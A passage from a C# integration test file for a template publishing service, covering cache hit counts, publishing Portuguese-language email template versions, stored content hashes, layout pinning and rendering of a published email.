        PublishedReadCache cache = fixture.Services.GetRequiredService<PublishedReadCache>();
        var loads = cache.PointerLoads;
        var hits = cache.PointerHits;
        Result<PublishedTemplateLookup> lookup = await FindTemplateAsync("araia-cambio", bystander);

        (cache.PointerLoads - loads).ShouldBe(
            0, "a transição de um template não pode custar recarga a quem ela não tocou");
        (cache.PointerHits - hits).ShouldBe(1);
        lookup.Value.ShouldBeOfType<PublishedTemplateLookup.Published>()
            .Template.TemplateKey.ShouldBe(bystander);
    }

    /// <summary>A second version of an existing template, with a body that differs from the first.</summary>
    private static async Task<int> PublishCorrectedVersionAsync(
        HttpClient author,
        HttpClient publisher,
        string key)
    {
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Pedido {{ orderId }}",
            body = "<p>Pedido {{ orderId }} corrigido.</p>",
            bodyText = "Pedido {{ orderId }} corrigido.",
        }, etag);
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new { orderId = new { type = "string" } },
            required = RequiredOrderId,
        }, etag);
        return await TemplateApi.PublishAsync(publisher, key, version);
    }

    private async Task<Result<PublishedClassPolicy>> FindClassPolicyAsync(string application)
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedCatalog catalog = scope.ServiceProvider.GetRequiredService<IPublishedCatalog>();
        return await catalog.FindClassPolicyAsync(
            application, ClassPolicyApi.DefaultClass, CancellationToken.None);
    }

    private async Task<Result<PublishedTemplateLookup>> FindTemplateAsync(string application, string key)
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedCatalog catalog = scope.ServiceProvider.GetRequiredService<IPublishedCatalog>();
        return await catalog.FindTemplateAsync(application, key, CancellationToken.None);
    }

    private async Task<string> StoredVersionContentHashAsync(string key, int version)
    {
        var hash = string.Empty;
        await fixture.ExecuteDbAsync(async dbContext =>
        {
            TemplateVersion stored = await dbContext.TemplateVersions
                .AsNoTracking()
                .WhereTemplateKey(TemplateKey.Create(key).Value!)
                .SingleAsync(candidate => candidate.Version == version);
            hash = stored.ContentHash;
        });
        return hash;
    }

    private async Task<string> StoredPolicyContentHashAsync(string application, int version)
    {
        var hash = string.Empty;
        await fixture.ExecuteDbAsync(async dbContext =>
        {
            ClassPolicyVersion stored = await dbContext.ClassPolicyVersions
                .AsNoTracking()
                .SingleAsync(candidate => candidate.Application == application
                    && candidate.Version == version);
            hash = stored.ContentHash;
        });
        return hash;
    }

    /// <summary>A published template version whose email content is framed by the given layout version.</summary>
    private static async Task<string> PublishTemplatePinnedToLayoutAsync(
        HttpClient author,
        HttpClient publisher,
        string layoutKey,
        int layoutVersion)
    {
        var key = await TemplateApi.CreateTemplateAsync(author, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
        {
            subject = "Pedido {{ orderId }}",
            body = "<p>Pedido {{ orderId }} atualizado.</p>",
            bodyText = "Pedido {{ orderId }} atualizado.",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new { orderId = new { type = "string" } },
            required = RequiredOrderId,
        }, etag);
        HttpResponseMessage pinned = await author.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();
        await TemplateApi.PublishAsync(publisher, key, version);
        return key;
    }

    private async Task<Result<PublishedTemplateRender>> RenderPublishedEmailAsync(string key)
    {
        using IServiceScope scope = fixture.Services.CreateScope();
        IPublishedTemplateRenderer renderer =
            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
        return await renderer.RenderAsync(new PublishedRenderRequest
        {
            Application = "araia-cambio",
            TemplateKey = key,
            Channel = "email",
            Locale = "pt-BR",
            Variables = Variables("""{ "orderId": "42" }"""),
        }, CancellationToken.None);
    }

    private static JsonElement Variables(string json)
        => JsonSerializer.Deserialize<JsonElement>(json);
}
